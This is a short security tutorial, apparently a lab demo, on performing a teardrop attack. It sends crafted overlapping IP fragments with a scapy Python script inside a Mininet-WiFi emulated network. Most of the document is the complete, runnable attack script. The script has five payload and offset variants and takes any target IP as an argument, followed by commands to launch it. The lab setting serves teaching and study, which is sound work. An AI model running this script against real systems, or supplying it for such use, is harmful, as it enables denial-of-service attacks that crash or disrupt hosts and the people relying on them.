---
tags: security-tutorials
---

# Teardrop Attack

**In this short demo you will:** 
- Learn on how to perform teardrop attack
- **Demo**: https://www.youtube.com/watch?v=-s53tku0fJ0


**Requirements:** 
- Mininet-WiFi - https://github.com/intrig-unicamp/mininet-wifi
- scapy


First of all you need to run mininet-wifi with the command below:

```
$ sudo mn
```

Then you take the code below:

```python=
#!/usr/bin/env python
import sys
from scapy.all import *

total = len(sys.argv)
if total != 3:
    print("Performs teardrop attack")
    print(" ")
    print("Usage: ./tear TARGET-IP ATTACK-CODE")
    print("   Attack Codes:")
    print("   0: small payload (36 bytes), 2 packets, offset=3x8 bytes")
    print("   1: large payload (1300 bytes), 2 packets, offset=80x8 bytes")
    print("   2: large payload (1300 bytes), 12 packets, offset=80x8 bytes")
    print("   3: large payload (1300 bytes), 2 packets, offset=3x8 bytes")
    print("   4: large payload (1300 bytes), 2 packets, offset=10x8 bytes")

target=str(sys.argv[1])
attack=sys.argv[2]

print('Attacking target ' + target + ' with attack ' + attack)

if attack == '0':
    print("Using attack 0")
    size=36
    offset=3
    load1="\x00"*size

    i=IP()
    i.dst=target
    i.flags="MF"
    i.proto=17

    size=4
    offset=18
    load2="\x00"*size

    j=IP()
    j.dst=target
    j.flags=0
    j.proto=17
    j.frag=offset

    send(i/load1)
    send(j/load2)

elif attack == '1':
    print("Using attack 1")
    size=1300
    offset=80
    load="A"*size

    i=IP()
    i.dst=target
    i.flags="MF"
    i.proto=17

    j=IP()
    j.dst=target
    j.flags=0
    j.proto=17
    j.frag=offset

    send(i/load)
    send(j/load)

elif attack == '2':
    print("Using attack 2")
    print("Attacking with attack 2")
    size=1300
    offset=80
    load="A"*size

    i=IP()
    i.dst=target
    i.proto=17
    i.flags="MF"
    i.frag=0
    send(i/load)

    print("Attack 2 packet 0")

    for x in range(1, 10):
      i.frag=offset
      offset=offset+80
      send(i/load)
      print("Attack 2 packet " + str(x))

    i.frag=offset
    i.flags=0
    send(i/load)

elif attack == '3':
    print("Using attack 3")
    size=1336
    offset=3
    load1="\x00"*size

    i=IP()
    i.dst=target
    i.flags="MF"
    i.proto=17

    size=4
    offset=18
    load2="\x00"*size

    j=IP()
    j.dst=target
    j.flags=0
    j.proto=17
    j.frag=offset

    send(i/load1)
    send(j/load2)

else:
    print("Using attack 4")
    size=1300
    offset=10
    load="A"*size

    i=IP()
    i.dst=target
    i.flags="MF"
    i.proto=17

    j=IP()
    j.dst=target
    j.flags=0
    j.proto=17
    j.frag=offset

    send(i/load)
    send(j/load)

print("Done!")
```

and run it from **h1**:


```
mininet-wifi> xterm h1
h1# python teadrop.py 10.0.0.1 0
```

The number 0 can be replaced by 1, 2, 3 or 4.


___    
Source: https://samsclass.info/123/proj10/teardrop.htm
